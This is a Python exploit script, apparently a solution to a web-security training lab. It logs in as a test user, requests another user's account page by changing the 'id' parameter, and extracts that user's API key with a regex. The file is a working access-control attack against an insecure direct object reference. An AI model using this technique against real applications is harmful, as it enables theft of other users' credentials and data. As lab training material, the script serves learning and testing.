import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text,
        'html.parser')
    csrf = html.find(
        "input", {'name': 'csrf'})['value']
    return csrf
    
def is_login_successful(url, session):
    login_url = url + "/login"
    csrf_token = get_csrf_token(
        login_url, session)
    data_login = {
        "username": "wiener",
        "password": "peter",
        "csrf" : csrf_token
    }
    response = session.post(
        login_url,
        data=data_login,
        verify=False,
        proxies=proxies
    )
    return "Log out" in response.text

def get_carlos_api_key(url, session):
    carlos_account_url = (
        url + "/my-account?id=carlos")
    response = session.get(
        carlos_account_url,
        verify=False,
        allow_redirects=False,
        proxies=proxies
    )
    if 'carlos' in response.text:
        api_key = re.findall(
            r'Your API Key is:(.*)\<\/div>', response.text)[0]
        return api_key
    raise ValueError("Carlos' API not found")

if __name__ == "__main__":
    try:
        url = sys.argv[1]
        session = requests.Session()
        print("[+] Starting Access Control attack...")
        if not is_login_successful(url, session):
            print("[-] Login was not successful.")
            sys.exit(FAIL)
        api_key = get_carlos_api_key(url, session)
        print("[+] Carlos' API Key is %s" % api_key)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The Access Control attack was not successful.")
        sys.exit(FAIL) 